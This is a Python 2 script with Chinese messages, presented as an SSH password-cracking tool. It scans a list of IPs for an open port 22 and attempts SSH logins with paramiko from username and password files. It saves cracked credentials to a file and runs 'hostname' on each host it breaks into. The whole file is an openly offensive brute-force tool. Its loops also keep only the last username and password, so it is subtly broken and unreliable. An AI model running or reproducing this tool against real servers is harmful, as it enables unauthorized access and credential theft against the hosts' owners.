# /usr/bin/env/python
# -*- coding:utf-8 -*-
# _auther:d3ckx1

import paramiko
import optparse
import sys
import socket
import time

banner = '''

 ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗       ███████╗███████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗      ██╔════╝██╔════╝██║  ██║
██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██║  ██║█████╗███████╗███████╗███████║
██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║╚════╝╚════██║╚════██║██╔══██║
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝      ███████║███████║██║  ██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝       ╚══════╝╚══════╝╚═╝  ╚═╝

			        Code by d3ckx1
'''
print banner

port = 22  # 默认22端口


def isopen(Target):
    tcp = socket.socket()
    tcp.settimeout(2)
    try:
        sock = (Target, port)
        tcp.connect(sock)
        print "[+] OK " + Target + ':' + str(port) + " 端口开放！"
        tcpok = open('tcpok.txt','a')
        tcpok.write(Target)
        tcpok.write('\n')
        print '写入成功!'
    except:
        print '[-] '+ Target + ':' + str(port) + " 端口未开放！"
        pass

    return tcp


def main():
    if len(sys.argv) == 8 or sys.argv[1] == '-h':
        print
        "Usage: python pwn_ssh2.py -t ip.txt -u user -p pass.txt"
    parse = optparse.OptionParser("usage: %prog -t ip.txt -u user.txt -p pass.txt")
    parse.add_option("-t", "--targets", dest="targets",
                     help="inut target hosts file (ip.txt)", type='string')
    parse.add_option("-u", "--username", dest="username", type='string',
                     help="input username/usernames file (user.txt)")
    parse.add_option("-p", "--password", dest="password",
                     help="input password/passwords file (pass.txt)", type='string')

    options, args = parse.parse_args()

    # targets = []
    targets = open(options.targets, 'rb')
    print '开始IP、端口探测存活工作!'
    for target in targets.readlines():
        Target = target.strip('\r\n')
        #print '开始IP、端口探测存活工作!！'
        isopen(Target)

    try:
        username = open(options.username, 'rb')
        for username in username.readlines():
            userss = username.strip('\r\n')


        passwords = open(options.password,'rb')
        for passwds in passwords.readlines():
            passwdss = passwds.strip('\r\n')


        print '开始SSH密码爆破工作!！'
        get_pwn(userss,passwdss)

    except:
        exit()



def get_pwn(userss,passwdss):
    hostss = open('tcpok.txt', 'rb')
    for hostsss in hostss.readlines():
        hosts = hostsss.strip('\r\n')

        try:

            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hosts, port, userss, passwdss)
            print '=' * 80
            print('\n[+] 报告主人SSH爆破成功！ IP:' + hosts + ' 端口：' + str(port) + ' 账户：' + userss + ' 密码：' + passwdss + ' [+]')
            print '='*80
            f = open('ssh-pwn.txt', 'a')
            f.write(hosts + ":" + str(port) + " - " + userss + ':' + passwdss)
            f.write('\n')
            stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
            result = stdout.read().decode('utf-8')
            print ' ---- 执行命令：hostname ----'
            print(result)
            print ' ---- 执行命令完成 ----'
            ssh.close()

        except:
            print '[-] %s is not crack it' % hosts
            pass


if __name__ == '__main__':
    localtime = time.asctime(time.localtime(time.time()))
    print "本次扫描时间为：", localtime
    print "=" * 88
    main()
    print "=" *88
    print "Lists is Check over!"
